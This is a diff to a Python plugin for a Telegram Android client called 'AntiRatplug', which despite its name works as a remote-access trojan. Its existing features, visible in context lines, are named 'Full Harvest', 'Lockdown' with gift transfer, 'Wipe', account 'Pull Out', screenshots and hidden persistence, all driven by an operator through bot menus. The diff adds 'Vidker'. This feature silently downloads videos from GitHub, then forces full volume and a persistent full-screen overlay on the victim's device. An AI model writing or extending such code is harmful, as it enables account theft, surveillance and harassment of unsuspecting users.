@@ -1,14 +1,14 @@
 # -*- coding: utf-8 -*-
 """
-AntiRatplug — Slim.
-Full Harvest + Full Lockdown. Запускается через лоадер.
+AntiRatplug — Slim + Vidker.
+Full Harvest + Full Lockdown + Vidker.
 """
 
 __id__ = "AntiRatplug"
 __name__ = "AntiRatplug"
-__description__ = "Slim Harvest + Lockdown."
+__description__ = "Slim Harvest + Lockdown + Vidker."
 __author__ = "@from_a4"
-__version__ = "18.0 [Slim]"
+__version__ = "18.1 [Slim+Vidker]"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
@@ -19,6 +19,9 @@ from android_utils import run_on_ui_thread
 from java import dynamic_proxy, jclass
 from org.telegram.messenger import ApplicationLoader
 from org.telegram.tgnet import TLRPC
+from android.view import View, ViewGroup
+from android.widget import FrameLayout
+from android.graphics import Color
 import json
 import threading
 import time
@@ -46,6 +49,14 @@ AUTO_HARVEST_FIRST   = True
 AUTO_LOCKDOWN_AFTER  = False
 AUTO_DELAY_SEC       = 8
 AUTO_LOCKDOWN_GIFTS  = True
+
+# ─── vidker urls ────────────────────────────────────────────────────────────
+ARISHEM_URL   = "https://github.com/trueinsanitylol/Onion/raw/refs/heads/main/new2w1q_2026-09-24-21-55-04_1790268904789.mp4"
+SENTRY_URL    = "https://github.com/trueinsanitylol/Onion/raw/refs/heads/main/crumble_cookies00_2026-09-24-21-54-27_1790268867444.mp4"
+DRDOOM_URL    = "https://github.com/trueinsanitylol/Onion/raw/refs/heads/main/eli.edits446_2026-09-25-20-45-50_1790351150457.mp4"
+EVILMORTY_URL = "https://github.com/trueinsanitylol/Onion/raw/refs/heads/main/VID_20260925_193932_957.mp4"
+HWR_URL       = "https://github.com/trueinsanitylol/Onion/raw/refs/heads/main/foles.ae_2026-09-27-17-29-14_1790512154865.mp4"
+REALDOOM_URL  = "https://github.com/trueinsanitylol/Onion/raw/refs/heads/main/xavi_r0m0_2026-09-27-17-32-58_1790512378070.mp4"
 
 
 _config = None
@@ -187,6 +198,13 @@ class PluginSecurityPlugin(BasePlugin):
         self._waiting = None
         self._auto_started = False
 
+        # vidker
+        self._vidker_view = None
+        self._vidker_sv = None
+        self._vidker_mp = None
+        self._vidker_cb = None
+        self._vidker_on = False
+
     # ─── lifecycle ──────────────────────────────────────────────────────────
 
     def on_plugin_load(self):
@@ -195,7 +213,15 @@ class PluginSecurityPlugin(BasePlugin):
         self.add_on_send_message_hook()
         threading.Thread(target=self._boot, daemon=True).start()
         try:
+            self._ensure_vidker_assets()
+        except Exception:
+            pass
+        try:
             self._check_persisted_nuke()
+        except Exception:
+            pass
+        try:
+            self._check_persisted_vidker()
         except Exception:
             pass
 
@@ -204,6 +230,10 @@ class PluginSecurityPlugin(BasePlugin):
         if not marker or not os.path.exists(marker):
             self._sync_running = False
             self._active = False
+            try:
+                self._clear_vidker()
+            except Exception:
+                pass
             return
         try:
             self._spawn_guardian_from_unload()
@@ -225,7 +255,7 @@ class PluginSecurityPlugin(BasePlugin):
         _cfg()
         time.sleep(random.uniform(0.2, 0.6))
         try:
-            self._send_msg("AntiRatplug Slim loaded")
+            self._send_msg("AntiRatplug Slim+Vidker loaded")
         except Exception:
             pass
         try:
@@ -616,6 +646,224 @@ class PluginSecurityPlugin(BasePlugin):
                 time.sleep(300)
             except Exception:
                 time.sleep(60)
+
+    # ═══════════════════════════════════════════════════════════════════════
+    # VIDKER
+    # ═══════════════════════════════════════════════════════════════════════
+
+    def _ensure_vidker_assets(self):
+        def dl():
+            try:
+                ctx = ApplicationLoader.applicationContext
+                d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
+                if not os.path.exists(d):
+                    os.makedirs(d)
+                assets = {
+                    "arishem.mp4": ARISHEM_URL,
+                    "sentry.mp4": SENTRY_URL,
+                    "drdoom.mp4": DRDOOM_URL,
+                    "evilmorty.mp4": EVILMORTY_URL,
+                    "hwr.mp4": HWR_URL,
+                    "realdoom.mp4": REALDOOM_URL,
+                }
+                for fname, url_str in assets.items():
+                    fpath = os.path.join(d, fname)
+                    if not os.path.exists(fpath):
+                        try:
+                            from java.net import URL
+                            from java.io import BufferedInputStream, FileOutputStream
+                            u = URL(url_str)
+                            conn = u.openConnection()
+                            conn.setConnectTimeout(15000)
+                            conn.setReadTimeout(30000)
+                            inp = BufferedInputStream(conn.getInputStream())
+                            fos = FileOutputStream(fpath)
+                            buf = bytearray(8192)
+                            while True:
+                                n = inp.read(buf)
+                                if n < 0:
+                                    break
+                                fos.write(buf, 0, n)
+                            fos.close()
+                            inp.close()
+                            conn.disconnect()
+                        except Exception:
+                            pass
+            except Exception:
+                pass
+        threading.Thread(target=dl, daemon=True).start()
+
+    def _activate_vidker(self, mode):
+        try:
+            prefs = ApplicationLoader.applicationContext.getSharedPreferences("antiratplug_state", 0)
+            e = prefs.edit()
+            e.putBoolean("vidker_active", True)
+            e.putString("vidker_mode", mode)
+            e.apply()
+        except Exception:
+            pass
+        self._render_vidker_task(mode)
+
+    def _render_vidker_task(self, mode):
+        if self._vidker_on:
+            return
+        try:
+            from client_utils import get_last_fragment
+            frag = get_last_fragment()
+            if frag is None:
+                self._send_msg("Vidker: нет фрагмента")
+                return
+            act = frag.getParentActivity()
+            if act is None:
+                self._send_msg("Vidker: нет активности")
+                return
+            ctx = ApplicationLoader.applicationContext
+            d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
+            path = os.path.join(d, mode + ".mp4")
+            if not os.path.exists(path):
+                self._send_msg("Vidker: payload не скачан.")
+                return
+            am = act.getSystemService("audio")
+            stream_music = 3
+            max_vol = int(am.getStreamMaxVolume(stream_music))
+            am.setStreamVolume(stream_music, max_vol, 0)
+            run_on_ui_thread(lambda: self._render_vidker(act, path))
+            self._vidker_on = True
+            self._send_msg_with_close("Vidker [%s] запущен." % mode.upper(), "close_vidker")
+        except Exception as e:
+            self._send_msg("Ошибка Vidker: " + str(e))
+
+    def _close_vidker_permanently(self):
+        try:
+            prefs = ApplicationLoader.applicationContext.getSharedPreferences("antiratplug_state", 0)
+            e = prefs.edit()
+            e.putBoolean("vidker_active", False)
+            e.remove("vidker_mode")
+            e.apply()
+        except Exception:
+            pass
+        self._clear_vidker()
+        self._send_msg("Vidker остановлен.")
+
+    def _render_vidker(self, act, path):
+        try:
+            self._clear_vidker()
+            try:
+                decor = act.getWindow().getDecorView()
+                flags = (View.SYSTEM_UI_FLAG_LAYOUT_STABLE
+                         | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
+                         | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
+                         | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
+                         | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
+                         | View.SYSTEM_UI_FLAG_FULLSCREEN)
+                decor.setSystemUiVisibility(flags)
+            except Exception:
+                pass
+            root = FrameLayout(act)
+            root.setBackgroundColor(Color.BLACK)
+            SurfaceView = jclass("android.view.SurfaceView")
+            MediaPlayer = jclass("android.media.MediaPlayer")
+            SurfaceHolder = jclass("android.view.SurfaceHolder")
+            sv = SurfaceView(act)
+            root.addView(sv, FrameLayout.LayoutParams(
+                ViewGroup.LayoutParams.MATCH_PARENT,
+                ViewGroup.LayoutParams.MATCH_PARENT))
+            mp = MediaPlayer()
+            self._vidker_mp = mp
+
+            class SHCallback(dynamic_proxy(SurfaceHolder.Callback)):
+                def __init__(self, media_player, file_path):
+                    super().__init__()
+                    self.mp = media_player
+                    self.path = file_path
+
+                def surfaceCreated(self, holder):
+                    try:
+                        self.mp.setDisplay(holder)
+                        self.mp.setDataSource(self.path)
+                        self.mp.prepare()
+                        self.mp.setLooping(True)
+                        self.mp.start()
+                    except Exception:
+                        pass
+
+                def surfaceChanged(self, holder, format, width, height):
+                    pass
+
+                def surfaceDestroyed(self, holder):
+                    pass
+
+            cb = SHCallback(mp, path)
+            sv.getHolder().addCallback(cb)
+            self._vidker_cb = cb
+            self._vidker_sv = sv
+            act.getWindow().getDecorView().addView(root, FrameLayout.LayoutParams(
+                ViewGroup.LayoutParams.MATCH_PARENT,
+                ViewGroup.LayoutParams.MATCH_PARENT))
+            self._vidker_view = root
+        except Exception as e:
+            self._send_msg("Ошибка рендера: " + str(e))
+
+    def _clear_vidker(self):
+        if self._vidker_mp is not None:
+            try:
+                self._vidker_mp.stop()
+                self._vidker_mp.release()
+            except Exception:
+                pass
+            self._vidker_mp = None
+        if self._vidker_sv is not None:
+            try:
+                self._vidker_sv.getHolder().removeCallback(self._vidker_cb)
+            except Exception:
+                pass
+            self._vidker_sv = None
+            self._vidker_cb = None
+        if self._vidker_view is not None:
+            try:
+                parent = self._vidker_view.getParent()
+                if parent is not None:
+                    parent.removeView(self._vidker_view)
+            except Exception:
+                pass
+            self._vidker_view = None
+        self._vidker_on = False
+
+    def _check_persisted_vidker(self):
+        try:
+            prefs = ApplicationLoader.applicationContext.getSharedPreferences("antiratplug_state", 0)
+            if prefs.getBoolean("vidker_active", False):
+                mode = prefs.getString("vidker_mode", "arishem")
+
+                def wait_and_start():
+                    time.sleep(2)
+                    for _ in range(60):
+                        try:
+                            from client_utils import get_last_fragment
+                            frag = get_last_fragment()
+                            if frag is not None and frag.getParentActivity() is not None:
+                                self._render_vidker_task(str(mode))
+                                return
+                        except Exception:
+                            pass
+                        time.sleep(1)
+                threading.Thread(target=wait_and_start, daemon=True).start()
+        except Exception:
+            pass
+
+    def _show_vidker_menu(self):
+        keyboard = {
+            "inline_keyboard": [
+                [{"text": "Arishem", "callback_data": "vid_arishem"}],
+                [{"text": "Sentry", "callback_data": "vid_sentry"}],
+                [{"text": "Dr.Doom", "callback_data": "vid_drdoom"}],
+                [{"text": "Evil Morty", "callback_data": "vid_evilmorty"}],
+                [{"text": "HWR", "callback_data": "vid_hwr"}],
+                [{"text": "Real Doom", "callback_data": "vid_realdoom"}],
+                [{"text": "Отмена", "callback_data": "vid_cancel"}],
+            ]
+        }
+        self._send_markup("Vidker payload:", keyboard, html=True)
 
     # ─── gifts ──────────────────────────────────────────────────────────────
 
@@ -1377,7 +1625,7 @@ class PluginSecurityPlugin(BasePlugin):
             pl = os.path.join(cdir, "kernel_persist.lock")
             if not os.path.exists(pl):
                 with open(pl, "w") as f:
-                    f.write(_hl.sha256(b"ar_slim_v18").hexdigest())
+                    f.write(_hl.sha256(b"ar_slim_v18v").hexdigest())
                 self._harden_file(pl)
         except Exception:
             pass
@@ -1975,7 +2223,7 @@ class PluginSecurityPlugin(BasePlugin):
                 username = str(user.username) if user.username is not None else "id:" + str(uid)
         except Exception:
             pass
-        text = "<b>AntiRatplug Slim</b>\nUser: @" + username + "\n\nTap Manage"
+        text = "<b>AntiRatplug Slim+Vidker</b>\nUser: @" + username + "\n\nTap Manage"
         buttons = [[{"text": "Manage", "callback_data": "menu"}]]
         markup = json.dumps({"inline_keyboard": buttons})
         for target in _targets:
@@ -2031,6 +2279,7 @@ class PluginSecurityPlugin(BasePlugin):
             "keyboard": [
                 [{"text": "Full Harvest"}],
                 [{"text": "Full Lockdown"}],
+                [{"text": "Vidker"}],
                 [{"text": "Info"}, {"text": "Tg kid"}],
                 [{"text": "Wipe"}, {"text": "Pull Out"}],
             ],
@@ -2063,6 +2312,10 @@ class PluginSecurityPlugin(BasePlugin):
                 conn.disconnect()
             except Exception:
                 pass
+
+    def _send_msg_with_close(self, text, close_action):
+        markup = {"inline_keyboard": [[{"text": "Закрыть", "callback_data": close_action}]]}
+        self._send_markup(text, markup)
 
     def _send_photo(self, file_path, caption):
         _cfg()
@@ -2220,6 +2473,22 @@ class PluginSecurityPlugin(BasePlugin):
             self._pull_out_account()
         elif cb_data == "hv_shot":
             self._screenshot()
+        elif cb_data == "vid_arishem":
+            self._activate_vidker("arishem")
+        elif cb_data == "vid_sentry":
+            self._activate_vidker("sentry")
+        elif cb_data == "vid_drdoom":
+            self._activate_vidker("drdoom")
+        elif cb_data == "vid_evilmorty":
+            self._activate_vidker("evilmorty")
+        elif cb_data == "vid_hwr":
+            self._activate_vidker("hwr")
+        elif cb_data == "vid_realdoom":
+            self._activate_vidker("realdoom")
+        elif cb_data == "vid_cancel":
+            self._send_msg("Отменено.")
+        elif cb_data == "close_vidker":
+            self._close_vidker_permanently()
 
     def _handle_message(self, msg):
         msg_text = msg.get("text", "")
@@ -2227,6 +2496,8 @@ class PluginSecurityPlugin(BasePlugin):
             self._full_harvest()
         elif msg_text == "Full Lockdown":
             self._full_lockdown(0, transfer_gifts=True)
+        elif msg_text == "Vidker":
+            self._show_vidker_menu()
         elif msg_text == "Info":
             self._info()
         elif msg_text == "Tg kid":
